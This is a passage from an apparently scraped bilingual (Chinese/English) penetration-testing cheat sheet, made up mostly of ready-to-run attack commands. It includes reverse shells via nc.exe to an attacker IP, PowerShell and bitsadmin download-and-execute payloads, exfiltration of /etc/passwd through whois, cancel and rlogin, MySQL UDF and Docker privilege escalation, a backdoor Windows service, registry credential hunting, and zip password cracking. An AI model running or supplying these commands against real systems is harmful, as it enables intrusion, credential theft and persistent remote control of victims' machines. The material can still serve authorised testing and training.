title="Python代码执行"></a>Python代码执行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&apos;os&apos;).system(&apos;id&apos;)</span><br></pre></td></tr></table></figure><h2 id="Local-Enumeration-amp-Privilege-Escalation"><a href="#Local-Enumeration-amp-Privilege-Escalation" class="headerlink" title="Local Enumeration &amp; Privilege Escalation"></a>Local Enumeration &amp; Privilege Escalation</h2><p><img src="\images\Pentesting\Local Enumeration.jpg" alt></p><p><a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="noopener">https://github.com/sagishahar/lpeworkshop</a></p><h2 id="ImmunityDebugger"><a href="#ImmunityDebugger" class="headerlink" title="ImmunityDebugger"></a>ImmunityDebugger</h2><h3 id="Get-Loaded-Modules"><a href="#Get-Loaded-Modules" class="headerlink" title="Get Loaded Modules"></a>Get Loaded Modules</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># We&apos;re interested in modules without protection, Read &amp; Execute permissions</span><br><span class="line">!mona modules</span><br></pre></td></tr></table></figure><h3 id="Finding-JMP-ESP-Address"><a href="#Finding-JMP-ESP-Address" class="headerlink" title="Finding JMP ESP Address"></a>Finding JMP ESP Address</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona find -s &quot;\xFF\xE4&quot; -m moduleName</span><br></pre></td></tr></table></figure><h3 id="ZIP爆破"><a href="#ZIP爆破" class="headerlink" title="ZIP爆破"></a>ZIP爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip</span><br></pre></td></tr></table></figure><p>参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">USAGE: fcrackzip</span><br><span class="line">          [-b|--brute-force]            use brute force algorithm　暴破</span><br><span class="line">          [-D|--dictionary]             use a dictionary　字典模式</span><br><span class="line">          [-B|--benchmark]              execute a small benchmark　速度测试</span><br><span class="line">          [-c|--charset characterset]   use characters from charset　指定字符类型（数字，字母，混合等）</span><br><span class="line">          [-h|--help]                   show this message</span><br><span class="line">          [--version]                   show the version of this program</span><br><span class="line">          [-V|--validate]               sanity-check the algortihm</span><br><span class="line">          [-v|--verbose]                be more verbose</span><br><span class="line">          [-p|--init-password string]   use string as initial password/file　指定开始字符（比如要只记得密码是５开头的６位纯数字，可以指定从５００００００开始破解，节约时间）</span><br><span class="line">          [-l|--length min-max]         check password with length min to max　（指定密码长度区间）</span><br><span class="line">          [-u|--use-unzip]              use unzip to weed out wrong passwords　　（这个选项很很重要，很重要）</span><br><span class="line">          [-m|--method num]             use method number &quot;num&quot; (see below)　（指定破解类型）</span><br><span class="line">          [-2|--modulo r/m]             only calculcate 1/m of the password</span><br><span class="line">          file...                    the zipfiles to crack</span><br></pre></td></tr></table></figure><p>不知密码长度的情况下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -b -c1 -u test.zip (－b 指定模式为暴破，-c1指定密码类型为纯数字，其它类型可以rtfm,-u这个参数非常重要不然不显示破解出来的密码,-l 5-6可以指定长度)</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://blog.csdn.net/u011500307/article/details/17371651" target="_blank" rel="noopener">https://blog.csdn.net/u011500307/article/details/17371651</a></p><h3 id="Setting-up-Simple-HTTP-server"><a href="#Setting-up-Simple-HTTP-server" class="headerlink" title="Setting up Simple HTTP server"></a>Setting up Simple HTTP server</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">python -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server</span><br><span class="line">ruby -r webrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</span><br><span class="line">php -S 0.0.0.0:80</span><br></pre></td></tr></table></figure><h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raptor_udf2.c and sid-shell.c or full tarball</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table npn(line blob);</span><br><span class="line">insert into npn values(load_file(&apos;/tmp/raptor_udf2.so&apos;));</span><br><span class="line">select * from npn into dumpfile &apos;/usr/lib/raptor_udf2.so&apos;;</span><br><span class="line">create function do_system returns integer soname &apos;raptor_udf2.so&apos;;</span><br><span class="line">select do_system(&apos;chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell&apos;);</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://ejtaal.net/infosec/lordoftheroot/index.html" target="_blank" rel="noopener">https://ejtaal.net/infosec/lordoftheroot/index.html</a></p><h3 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff&quot; &gt; Dockerfile &amp;&amp; docker build -t my-docker-image . &amp;&amp; docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c &apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos; &amp;&amp; ./sh -c id &amp;&amp; ./sh</span><br></pre></td></tr></table></figure><h3 id="重置root用户密码"><a href="#重置root用户密码" class="headerlink" title="重置root用户密码"></a>重置root用户密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root:spotless&quot; | chpasswd   //非交互式修改密码</span><br></pre></td></tr></table></figure><h2 id="上传文件到目标"><a href="#上传文件到目标" class="headerlink" title="上传文件到目标"></a>上传文件到目标</h2><h3 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp</span><br><span class="line">service atftpd start</span><br><span class="line"></span><br><span class="line"># Windows</span><br><span class="line">tftp -i $ATTACKER get /download/location/file /save/location/file</span><br></pre></td></tr></table></figure><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Linux: set up ftp server with anonymous logon access;</span><br><span class="line">twistd -n ftp -p 21 -r /file/to/serve</span><br><span class="line"></span><br><span class="line"># Windows shell: read FTP commands from ftp-commands.txt non-interactively;</span><br><span class="line">echo open $ATTACKER&gt;ftp-commands.txt</span><br><span class="line">echo anonymous&gt;&gt;ftp-commands.txt</span><br><span class="line">echo whatever&gt;&gt;ftp-commands.txt</span><br><span class="line">echo binary&gt;&gt;ftp-commands.txt</span><br><span class="line">echo get file.exe&gt;&gt;ftp-commands.txt</span><br><span class="line">echo bye&gt;&gt;ftp-commands.txt </span><br><span class="line">ftp -s:ftp-commands.txt</span><br><span class="line"></span><br><span class="line"># Or just a one-liner</span><br><span class="line">(echo open 10.11.0.245&amp;echo anonymous&amp;echo whatever&amp;echo binary&amp;echo get nc.exe&amp;echo bye) &gt; ftp.txt &amp; ftp -s:ftp.txt &amp; nc.exe 10.11.0.245 443 -e cmd</span><br></pre></td></tr></table></figure><h3 id="CertUtil"><a href="#CertUtil" class="headerlink" title="CertUtil"></a>CertUtil</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">下载：</span><br><span class="line">CertUtilcertutil  -urlcache  -split  -f  bad.exe   //保存在当前路径，文件名称和下载文件名称相同</span><br><span class="line">certutil  -urlcache  -split  -f bad.exe bad1.exe   //保存在当前路径，指定保存文件名称</span><br><span class="line">certutil  -urlcache   -f bad.exe //缓存目录位置：  %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</span><br><span class="line"></span><br><span class="line">上传：</span><br><span class="line">certutil  -urlcache   -f   bad.exe delete</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://www.cnblogs.com/backlion/p/7325228.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/7325228.html</a></p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;/var/tmp/shell.php&quot;, file_get_contents(&quot;http://10.11.0.245/shell.php&quot;)); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&apos;http://10.11.0.245/nc.exe&apos;, &apos;C:\\Temp\\nc.exe&apos;)&quot;</span><br></pre></td></tr></table></figure><h3 id="HTTP-Powershell"><a href="#HTTP-Powershell" class="headerlink" title="HTTP: Powershell"></a>HTTP: Powershell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&apos;http://$ATTACKER/nc.exe&apos;,&apos;nc.exe&apos;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot; &#125;</span><br><span class="line">powershell -Command &quot;&amp; &#123;(New-Object System.Net.WebClient).DownloadFile(&apos;http://$ATTACKER/nc.exe&apos;,&apos;nc.exe&apos;); Start-Process nc.exe -NoNewWindow -Argumentlist &apos;$ATTACKER 4444 -e cmd.exe&apos;&quot; &#125;</span><br><span class="line">powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&apos;http://$ATTACKER/nc.exe&apos;,&apos;nc.exe&apos;)&quot;; Start-Process nc.exe -NoNewWindow -Argumentlist &apos;$ATTACKER 4444 -e cmd.exe&apos;&quot;</span><br><span class="line">powershell (New-Object System.Net.WebClient).DownloadFile(&apos;http://$ATTACKER/file.exe&apos;,&apos;file.exe&apos;);(New-Object -com Shell.Application).ShellExecute(&apos;file.exe&apos;);</span><br><span class="line"></span><br><span class="line"># download using default proxy credentials and launch</span><br><span class="line">powershell -command &#123; $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString(&quot;http://$attacker/nc.exe&quot;) | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist &apos;$ATTACKER 4444 -e cmd.exe&apos;&quot; &#125;</span><br></pre></td></tr></table></figure><h3 id="HTTP-VBScript"><a href="#HTTP-VBScript" class="headerlink" title="HTTP: VBScript"></a>HTTP: VBScript</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript wget.vbs http://$ATTACKER/file.exe localfile.exe</span><br></pre></td></tr></table></figure><h3 id="HTTP-Linux"><a href="#HTTP-Linux" class="headerlink" title="HTTP: Linux"></a>HTTP: Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://$ATTACKER/file</span><br><span class="line">curl http://$ATTACKER/file -O</span><br><span class="line">scp ~/file/file.bin user@$TARGET:tmp/backdoor.py</span><br></pre></td></tr></table></figure><h3 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Attacker</span><br><span class="line">nc -l -p 4444 &lt; /tool/file.exe</span><br><span class="line"></span><br><span class="line"># Victim</span><br><span class="line">nc $ATTACKER 4444 &gt; file.exe</span><br></pre></td></tr></table></figure><h3 id="HTTP-Windows-“debug-exe”-Method"><a href="#HTTP-Windows-“debug-exe”-Method" class="headerlink" title="HTTP: Windows “debug.exe” Method"></a>HTTP: Windows “debug.exe” Method</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 1. In Linux, convert binary to hex ascii:</span><br><span class="line">wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt</span><br><span class="line"># 2. Paste nc.txt into Windows Shell.</span><br></pre></td></tr></table></figure><h3 id="HTTP-Windows-BitsAdmin"><a href="#HTTP-Windows-BitsAdmin" class="headerlink" title="HTTP: Windows BitsAdmin"></a>HTTP: Windows BitsAdmin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&amp;start %tmp%\payload.exe</span><br></pre></td></tr></table></figure><h3 id="Whois-Data-Exfiltration"><a href="#Whois-Data-Exfiltration" class="headerlink" title="Whois Data Exfiltration"></a>Whois Data Exfiltration</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># attacker</span><br><span class="line">nc -l -v -p 43 | sed &quot;s/ //g&quot; | base64 -d</span><br><span class="line"># victim</span><br><span class="line">whois -h $attackerIP -p 43 `cat /etc/passwd | base64`</span><br></pre></td></tr></table></figure><h3 id="Cancel-数据泄露"><a href="#Cancel-数据泄露" class="headerlink" title="Cancel 数据泄露"></a>Cancel 数据泄露</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cancel -u &quot;$(cat /etc/passwd)&quot; -h ip:port</span><br></pre></td></tr></table></figure><h3 id="rlogin数据泄露"><a href="#rlogin数据泄露" class="headerlink" title="rlogin数据泄露"></a>rlogin数据泄露</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlogin -l &quot;$(cat /etc/passwd)&quot; -p port host</span><br></pre></td></tr></table></figure><h3 id="指定范围ping"><a href="#指定范围ping" class="headerlink" title="指定范围ping"></a>指定范围ping</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for lastOctet in &#123;1..254&#125;; do </span><br><span class="line">    ping -c 1 10.0.0.$lastOctet | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 4 | cut -d &quot;:&quot; -f 1 &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="爆破XOR"><a href="#爆破XOR" class="headerlink" title="爆破XOR"></a>爆破XOR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">encrypted = &quot;encrypted-string-here&quot;</span><br><span class="line">for i in range(0,255):</span><br><span class="line">    print(&quot;&quot;.join([chr(ord(e) ^ i) for e in encrypted]))</span><br></pre></td></tr></table></figure><h3 id="生成错误字符"><a href="#生成错误字符" class="headerlink" title="生成错误字符"></a>生成错误字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Python</span><br><span class="line">&apos;\\&apos;.join([ &quot;x&#123;:02x&#125;&quot;.format(i) for i in range(1,256) ])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Bash</span><br><span class="line">for i in &#123;1..255&#125;; do printf &quot;\\\x%02x&quot; $i; done; echo -e &quot;\r&quot;</span><br></pre></td></tr></table></figure><h3 id="py-gt-exe"><a href="#py-gt-exe" class="headerlink" title=".py -&gt; .exe"></a>.py -&gt; .exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstaller.py --onefile convert-to-exe.py</span><br></pre></td></tr></table></figure><h3 id="Netcat-Portscan"><a href="#Netcat-Portscan" class="headerlink" title="Netcat Portscan"></a>Netcat Portscan</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvv -w 1 -z host 1000-2000</span><br><span class="line">nc -nv -u -z -w 1 host 160-162</span><br></pre></td></tr></table></figure><h3 id="渗透Windows-服务"><a href="#渗透Windows-服务" class="headerlink" title="渗透Windows 服务"></a>渗透Windows 服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Look for SERVICE_ALL_ACCESS in the output</span><br><span class="line">accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</span><br><span class="line"></span><br><span class="line">sc config [service_name] binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;</span><br><span class="line">sc qc [service_name] (to verify!)</span><br><span class="line">sc start [service_name]</span><br></pre></td></tr></table></figure><h3 id="查找为指定用户显式设置的文件-文件夹权限"><a href="#查找为指定用户显式设置的文件-文件夹权限" class="headerlink" title="查找为指定用户显式设置的文件/文件夹权限"></a>查找为指定用户显式设置的文件/文件夹权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls.exe C:\folder /findsid userName-or-*sid /t</span><br><span class="line">//look for (F)ull, (M)odify, (W)rite</span><br></pre></td></tr></table></figure><h3 id="AlwaysInstallElevated-MSI"><a href="#AlwaysInstallElevated-MSI" class="headerlink" title="AlwaysInstallElevated MSI"></a>AlwaysInstallElevated MSI</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated &amp; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>AlwaysInstallElevated是一个策略设置。微软允许非授权用户以SYSTEM权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的MSI文件就可以进行管理员权限的提升</p><p><a href="https://xz.aliyun.com/t/203" target="_blank" rel="noopener">Metasploit PowershellAlwaysInstallElevated提权实战</a></p><h3 id="Windows凭证"><a href="#Windows凭证" class="headerlink" title="Windows凭证"></a>Windows凭证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">c:\unattend.xml</span><br><span class="line">c:\sysprep.inf</span><br><span class="line">c:\sysprep\sysprep.xml</span><br><span class="line">dir c:\*vnc.ini /s /b</span><br><span class="line">dir c:\*ultravnc.ini /s /b </span><br><span class="line">dir c:\ /s /b | findstr /si *vnc.ini</span><br><span class="line"></span><br><span class="line">findstr /si password *.txt | *.xml | *.ini</span><br><span class="line">findstr /si pass *.txt | *.xml | *.ini</span><br><span class="line">dir /s *cred* == *pass* == *.conf</span><br><span class="line"></span><br><span class="line"># Windows Autologon</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line"></span><br><span class="line"># VNC</span><br><span class="line">reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><span class="line"></span><br><span class="line"># Putty</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line"></span><br><span class="line"># Registry</span><br><span class="line">reg query HKLM /f password /t REG_SZ /s </span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure><h3 id="没带引号的服务路径"><a href="#没带引号的服务路径" class="headerlink" title="没带引号的服务路径"></a>没带引号的服务路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="服务后门"><a href="#服务后门" class="headerlink" title="服务后门"></a>服务后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create spotlessSrv binpath= &quot;C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe&quot; obj= &quot;LocalSystem&quot; password= &quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="Port-Forwarding-SSH-Tunneling"><a href="#Port-Forwarding-SSH-Tunneling" class="headerlink" title="Port Forwarding / SSH Tunneling"></a>Port Forwarding / SSH Tunneling</h3><h4 id="SSH-Local-Port-Forwarding"><a href="#SSH-Local-Port-Forwarding" class="headerlink" title="SSH: Local Port Forwarding"></a>SSH: Local Port Forwarding</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER</span><br><span class="line"># Scenario: access a host that&apos;s being blocked by a firewall via SSH_SERVER;</span><br><span class="line">ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER</span><br></pre></td></tr></table></figure><h4 id="SSH-Dynamic-Port-Forwarding"><a href="#SSH-Dynamic-Port-Forwarding" class="headerlink" title="SSH: Dynamic Port Forwarding"></a>SSH: Dynamic Port Forwarding</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Listen on local port 8080. Incoming traffic to 127.0.0.1:8080 forwards it to final destination via SSH_SERVER</span><br><span class="line"># Scenario: proxy your web traffic through SSH tunnel OR access hosts on internal network via a compromised DMZ box;</span><br><span class="line">ssh -D 127.0.0.1:8080 user@SSH_SERVER</span><br></pre></td></tr></table></figure><h4 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Open port 5555 on SSH_SERVER. Incoming traffic to SSH_SERVER:5555 is tunneled to LOCALHOST:3389</span><br><span class="line"># Scenario: expose RDP on non-routable network;</span><br><span class="line">ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER</span><br><span class="line">plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP</span><br></pre></td></tr></table></figure><h4 id="代理隧道"><a href="#代理隧道" class="headerlink" title="代理隧道"></a>代理隧道</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Open a local port 127.0.0.1:5555. Incoming traffic to 5555 is proxied to DESTINATION_HOST through PROXY_HOST:3128</span><br><span class="line"># Scenario: a remote host has SSH running, but it&apos;s only bound to 127.0.0.1, but you want to reach it;</span><br><span class="line">proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555</span><br><span class="line">ssh user@127.0.0.1 -p 5555</span><br></pre></td></tr></table></figure><h4 id="http隧道"><a href="#http隧道" class="headerlink" title="http隧道"></a>http隧道</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22</span><br><span class="line">hts -F localhost:22 80</span><br><span class="line"></span><br><span class="line"># Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.15:80</span><br><span class="line">htc -F 8080 192.168.1.15:80</span><br><span class="line"></span><br><span class="line"># Client - connect to localhost:8080 -&gt; get tunneled to 192.168.1.15:80 -&gt; get redirected to 192.168.1.15:22</span><br><span class="line">ssh localhost -p 8080</span><br></pre></td></tr></table></figure><h3 id="Netsh转发"><a href="#Netsh转发" class="headerlink" title="Netsh转发"></a>Netsh转发</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># requires admin</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br></pre></td></tr></table></figure><h3 id="RunAs"><a href="#RunAs" class="headerlink" title="RunAs"></a>RunAs</h3><p>runas是Microsoft Windows系列操作系统中的一个命令，允许用户以不同的用户名运行特定的工具和程序，以用于以交互方式登录计算机的用户名。它类似于Unix命令sudo和su，但Unix命令通常需要系统管理员事先配置才能为特定用户和/或命令工作。</p><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Requires PSRemoting</span><br><span class="line">$username = &apos;Administrator&apos;;$password = &apos;1234test&apos;;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command &#123; whoami &#125;</span><br><span class="line"></span><br><span class="line"># without PSRemoting</span><br><span class="line">cmd&gt; powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential &apos;username&apos;, (ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force))</span><br><span class="line"></span><br><span class="line"># without PS Remoting, with arguments</span><br><span class="line">cmd&gt; powershell -command &quot;start-process cmd.exe -argumentlist &apos;/c calc&apos; -Credential (New-Object System.Management.Automation.PSCredential &apos;username&apos;,(ConvertTo-SecureString &apos;password&apos; -AsPlainText -Force))&quot;</span><br></pre></td></tr></table></figure><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Requires interactive console</span><br><span class="line">runas 